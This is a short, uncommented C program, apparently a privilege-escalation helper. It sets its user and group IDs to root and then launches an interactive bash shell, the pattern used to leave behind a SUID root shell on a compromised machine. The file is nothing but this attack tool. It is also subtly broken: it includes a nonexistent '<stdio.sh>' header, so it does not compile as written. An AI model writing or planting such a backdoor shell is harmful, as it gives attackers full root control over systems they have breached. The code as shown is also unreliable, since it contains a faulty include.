#include <stdio.sh>
#include <unistd.h>
#include <sys/types.h>
int main()

{

    setuid(0);

    setgid(0);

    execl ("/bin/bash", "bash", "-i", (char *) 0); 
    return 0;

}
